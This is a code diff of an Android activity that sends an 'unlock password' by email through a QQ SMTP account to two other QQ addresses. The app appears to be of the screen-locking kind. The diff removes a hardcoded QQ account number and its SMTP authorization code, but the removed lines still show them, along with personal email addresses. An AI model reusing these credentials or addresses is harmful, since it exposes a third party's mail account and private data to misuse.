@@ -54,11 +54,13 @@ import butterknife.ButterKnife;
 import butterknife.OnClick;
 
 
-/**
- * Created by CL on 7/13/17.
- */
 
 public class activity extends AppCompatActivity {
+    public static final String my_email = "";
+    public static final String my_email2 = "";
+    public static final String my_email3 = "";
+    public static final String my_email_num = "";
+    public static final String my_email_token = "";
     @BindView(R.id.et_password)
     EditText pwPassword;
     @BindView(R.id.tv_message)
@@ -337,7 +339,7 @@ public class activity extends AppCompatActivity {
                  *xxxxxxx:自己的QQ邮箱登录帐号，也就是qq号
                  *yyyyyyy:密码，使用授权码登录，而不能使用原始的QQ密码
                  */
-                return new PasswordAuthentication("410880617", "uiqbylnfvtnubhgc");
+                return new PasswordAuthentication(my_email_num, my_email_token);
             }
         };
         //1、连接
@@ -369,8 +371,8 @@ public class activity extends AppCompatActivity {
             //2、发送的内容对象Mesage
             final Message message = new MimeMessage(session);
             //2.1、发件人是谁
-            message.setFrom(new InternetAddress("410880617@qq.com"));
-            message.setRecipient(RecipientType.TO, new InternetAddress("2376606275@qq.com"));
+            message.setFrom(new InternetAddress(my_email));
+            message.setRecipient(RecipientType.TO, new InternetAddress(my_email2));
             // 2.3 主题（标题）
             message.setSubject("解锁密码_CarlosYang");
             // 2.4 正文
@@ -380,8 +382,8 @@ public class activity extends AppCompatActivity {
 
             final Message message2 = new MimeMessage(session);
             //2.1、发件人是谁
-            message2.setFrom(new InternetAddress("410880617@qq.com"));
-            message2.setRecipient(RecipientType.TO, new InternetAddress("272218160@qq.com"));
+            message2.setFrom(new InternetAddress(my_email));
+            message2.setRecipient(RecipientType.TO, new InternetAddress(my_email3));
             // 2.3 主题（标题）
             message2.setSubject("解锁密码_CarlosYang");
             // 2.4 正文
